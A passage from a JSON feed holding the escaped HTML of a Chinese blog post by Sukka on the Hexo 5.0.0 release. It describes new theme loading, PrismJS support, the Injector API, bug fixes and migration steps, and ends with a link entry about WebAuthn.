class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 <code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 <code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">Hexo 5.0.0 正式发布</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-07-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将 […]","link":"https://flyhigher.top/develop/2160.html"}]